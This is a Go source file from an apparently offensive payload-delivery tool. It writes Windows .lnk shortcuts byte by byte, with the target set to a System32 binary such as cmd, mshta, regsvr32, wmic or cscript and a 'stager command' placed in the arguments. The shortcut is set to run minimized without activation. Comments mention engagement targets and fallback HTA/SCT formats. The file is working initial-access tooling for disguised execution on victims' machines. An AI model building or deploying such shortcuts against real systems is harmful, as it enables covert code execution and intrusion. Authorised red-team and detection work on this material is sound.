// lnkbin.go — minimal MS-SHLLINK (.lnk) binary writer. Produces a Windows shell
// shortcut whose target is a System32 executable and whose ARGUMENTS carry the
// stager command. The byte layout is a 1:1 port of pylnk3's proven serialization
// (strayge/pylnk, LGPL-3.0): ShellLinkHeader + LinkTargetIDList (RootEntry +
// DriveEntry + one PathSegmentEntry per path component + terminal) + StringData
// ARGUMENTS (unicode) + ExtraData terminator.
//
// Every targeted path is chosen so all components fit the 8.3 short-name scheme
// (System32/System32\wbem executables: cmd, mshta, regsvr32, wmic, cscript). With
// short_name == full_name == the component name, the BEEF0004 long-name block size
// formula (24 + 2*len(short_name)) is byte-exact, so the output matches what pylnk3
// emits for these paths. powershell.exe is never targeted directly (its path has
// 8.3-unclean "WindowsPowerShell"/"v1.0" components); inline and remote-powershell
// modes wrap the powershell stager in cmd.exe, which resolves powershell via PATH.
//
// Windows on-target execution is the final verification step (see README "Delivery
// formats > lnk"). If a generated .lnk does not resolve on the engagement target,
// fall back to -f hta or -f sct.
package delivery

import (
	"strings"
	"unicode/utf16"
)

// Header / flag / show-command constants (MS-SHLLINK).
const (
	lnkHeaderSize        uint32 = 0x0000004C // fixed ShellLinkHeader size (76 bytes)
	lnkFlagHasIDList            = 0x00000001  // HasLinkTargetIDList
	lnkFlagHasArguments         = 0x00000020 // HasArguments
	lnkFlagIsUnicode           = 0x00000080  // IsUnicode (StringData uses UTF-16LE)
	lnkShowMinNoActive   uint32 = 7          // SW_SHOWMINNOACTIVE — minimized, no activation
	lnkTypeFolder        uint16 = 0x31       // PathSegmentEntry type: folder
	lnkTypeFile          uint16 = 0x32       // PathSegmentEntry type: file
	lnkFileAttrArchive   uint32 = 0x00000020 // FILE_ATTRIBUTE_ARCHIVE
)

// lnkLinkCLSID is the 16-byte shortcut CLSID {00021401-0000-0000-C000-000000000046}
// in the exact byte order pylnk3 writes (the _GUID constant).
var lnkLinkCLSID = [16]byte{
	0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
}

// lnkRootMyComputer is the RootEntry (My Computer) bytes: 0x1F 0x50 + GUID
// {20D04FE0-3AEA-1069-A2D8-08002B30309D} in pylnk3's reordered form (18 bytes).
var lnkRootMyComputer = []byte{
	0x1F, 0x50,
	0xE0, 0x4F, 0xD0, 0x20, // chars 0..3 reversed
	0xEA, 0x3A, 0x69, 0x10, // chars 4..7 reversed-in-pairs
	0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D, // chars 8..15 straight
}

// u16/u32/u64 write little-endian unsigned integers.
func u16(v uint16) []byte { return []byte{byte(v), byte(v >> 8)} }
func u32(v uint32) []byte { return []byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24)} }
func u64(v uint64) []byte {
	return []byte{byte(v), byte(v >> 8), byte(v >> 16), byte(v >> 24),
		byte(v >> 32), byte(v >> 40), byte(v >> 48), byte(v >> 56)}
}

// writeShellLink renders a complete .lnk for the given absolute target path and
// arguments string. targetPath must be a simple local path (drive:\...\file.exe)
// whose components are all 8.3-clean; lnkTarget (in lnk.go) guarantees this.
func writeShellLink(targetPath, args string) []byte {
	drive, comps := splitTargetPath(targetPath)

	// LinkTargetIDList items: Root(My Computer) + Drive + one entry per component.
	items := [][]byte{lnkRootMyComputer, driveEntryBytes(drive)}
	for i, c := range comps {
		items = append(items, pathSegmentEntryBytes(c, i == len(comps)-1))
	}
	idListBody := linkTargetIDListBody(items)

	var out []byte
	// --- ShellLinkHeader (76 bytes) ---
	out = append(out, u32(lnkHeaderSize)...)
	out = append(out, lnkLinkCLSID[:]...)
	out = append(out, u32(lnkFlagHasIDList|lnkFlagHasArguments|lnkFlagIsUnicode)...) // LinkFlags
	out = append(out, u32(lnkFileAttrArchive)...)                                    // FileAttributes
	out = append(out, u64(0)...)                                                      // CreationTime
	out = append(out, u64(0)...)                                                      // AccessTime
	out = append(out, u64(0)...)                                                      // WriteTime
	out = append(out, u32(0)...)                                                      // FileSize
	out = append(out, u32(0)...)                                                      // IconIndex
	out = append(out, u32(lnkShowMinNoActive)...)                                     // ShowCommand
	out = append(out, u16(0)...)                                                      // HotKey
	out = append(out, make([]byte, 10)...)                                            // Reserved (10 bytes)

	// --- LinkTargetIDList ---
	out = append(out, u16(uint16(len(idListBody)))...) // IDListSize
	out = append(out, idListBody...)

	// --- StringData: ARGUMENTS (the only section whose LinkFlags bit is set) ---
	out = append(out, sizedStringUnicode(args)...)

	// --- ExtraData terminator (no extra-data blocks) ---
	out = append(out, 0x00, 0x00, 0x00, 0x00)
	return out
}

// splitTargetPath splits "C:\Windows\System32\cmd.exe" into drive "C:" and
// components ["Windows","System32","cmd.exe"]. Empty segments (e.g. from a
// leading/unc backslash) are skipped.
func splitTargetPath(p string) (drive string, comps []string) {
	for _, part := range strings.Split(p, "\\") {
		if part == "" {
			continue
		}
		if drive == "" && strings.HasSuffix(part, ":") {
			drive = part
			continue
		}
		comps = append(comps, part)
	}
	return drive, comps
}

// driveEntryBytes renders a DriveEntry: 0x2F + drive + '\' + 19 nulls (23 bytes).
func driveEntryBytes(drive string) []byte {
	b := []byte{0x2F}
	b = append(b, drive...)
	b = append(b, '\\')
	b = append(b, make([]byte, 19)...)
	return b
}

// linkTargetIDListBody renders the IDList body: for each item, a 2-byte cb
// (= len(item)+2) + the item bytes; then a 2-byte terminal 0x0000. The caller
// prefixes this with the IDListSize = len(body).
func linkTargetIDListBody(items [][]byte) []byte {
	var body []byte
	for _, it := range items {
		body = append(body, u16(uint16(len(it)+2))...)
		body = append(body, it...)
	}
	body = append(body, 0x00, 0x00) // terminal ID
	return body
}

// pathSegmentEntryBytes renders one filesystem ITEMID (a path component). It is a
// 1:1 port of pylnk3's PathSegmentEntry.bytes with all timestamps zeroed and
// short_name == full_name == name (valid because all targeted names are 8.3-clean).
//
// Layout:
//
//	short(entry_type)            2
//	int(file_size)               4
//	dos_datetime(modified)       4   (date short + time short, both 0)
//	short(0x10)                  2   file attributes
//	short_name cstring            L + 1 + (1 if L even)   ANSI + null + even-pad
//	--- BEEF0004 long-name block ---
//	short(indicator = 24+2*L)    2
//	short(0x03)                  2   version
//	short(0x04)                  2   signature part1
//	short(0xBEEF)                2   signature part2
//	dos_datetime(created)        4
//	dos_datetime(accessed)       4
//	short(0x14)                  2   offset_unicode
//	short(0x00)                  2   offset_ansi
//	full_name cunicode            2*L + 2   UTF-16LE + null terminator
//	short(offset_part2=0x0E+shortNameLen) 2
func pathSegmentEntryBytes(name string, isFile bool) []byte {
	typ := lnkTypeFolder
	if isFile {
		typ = lnkTypeFile
	}
	L := len(name)

	var b []byte
	b = append(b, u16(typ)...)          // entry type
	b = append(b, u32(0)...)            // file size
	b = append(b, 0x00, 0x00, 0x00, 0x00) // modified dos datetime (date+time, both 0)
	b = append(b, u16(0x10)...)         // file attributes
	// short_name cstring: ANSI bytes + null + one padding null when L is even.
	b = append(b, name...)
	b = append(b, 0x00)
	if L%2 == 0 {
		b = append(b, 0x00)
	}

	// short_name_len (used for offset_part2) = (L+1) + ((L+1)%2), matching pylnk3.
	shortNameLen := (L + 1) + (L+1)%2

	// BEEF0004 long-name block.
	b = append(b, u16(uint16(24+2*L))...) // indicator / block size
	b = append(b, u16(0x03)...)           // version
	b = append(b, u16(0x04)...)           // signature part1
	b = append(b, u16(0xBEEF)...)         // signature part2
	b = append(b, 0x00, 0x00, 0x00, 0x00) // created dos datetime
	b = append(b, 0x00, 0x00, 0x00, 0x00) // accessed dos datetime
	b = append(b, u16(0x14)...)           // offset_unicode
	b = append(b, u16(0x00)...)           // offset_ansi
	// full_name cunicode: UTF-16LE + 0x0000 terminator.
	for _, r := range name {
		c := uint16(r) // name is ASCII
		b = append(b, byte(c), byte(c>>8))
	}
	b = append(b, 0x00, 0x00)
	b = append(b, u16(uint16(0x0E+shortNameLen))...) // offset_part2
	return b
}

// sizedStringUnicode renders a StringData section (unicode): 2-byte cch (UTF-16
// code-unit count) + UTF-16LE bytes, no null terminator. This is the ARGUMENTS
// payload; no other StringData sections are written (only HasArguments is set).
func sizedStringUnicode(s string) []byte {
	units := utf16.Encode([]rune(s))
	b := u16(uint16(len(units)))
	for _, c := range units {
		b = append(b, byte(c), byte(c>>8))
	}
	return b
}